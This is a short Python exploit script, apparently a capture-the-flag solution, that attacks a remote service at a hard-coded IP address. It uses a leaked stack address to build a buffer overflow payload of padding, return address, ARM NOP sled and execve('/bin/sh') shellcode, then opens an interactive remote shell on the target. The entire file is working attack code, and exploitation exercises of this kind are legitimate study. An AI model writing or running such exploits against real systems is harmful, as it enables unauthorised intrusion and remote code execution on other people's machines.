import socket
import telnetlib
import struct

HOST = "212.129.38.224"
PORT = 61045

padding = 'a' * 164
jump_addr = 0
nop_sled = '\xe3\x20\xf0\x00'*100
shellcode = '\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\xc0\x46\x01\x90\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68'
#shellcode credits to: http://shell-storm.org/shellcode/files/shellcode-696.php

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((HOST, PORT))
msg = s.recv(1024)
print(msg.decode('ascii'))

s.send("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n".encode('ascii'))

msg = s.recv(1024)
print(msg.decode('ascii'),end="")

base_addr = int(msg.decode('ascii').split(":")[0],16)
jump_addr = base_addr + 164 + 4 + 50
print("\nBase address : "+str(base_addr))
print("Jump Address : "+hex(jump_addr))
jump_addr = struct.pack('<I',jump_addr)


msg = s.recv(1024)
#print(msg.decode('ascii'))

s.send("y\n".encode('ascii'))
s.recv(1024)

padding = padding.encode('latin-1')
nop_sled = nop_sled.encode('latin-1')
shellcode = shellcode.encode('latin-1')
newline = '\n'.encode('latin-1')

payload = (padding+jump_addr+nop_sled+shellcode+newline)
print("\nPayload : "+str(payload))
s.send(payload)
s.recv(1024)
msg = s.recv(1024)

#print(msg.decode('latin-1'))
s.send("n\n".encode('ascii'))
print("HACKEDDD!!!!")

t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()
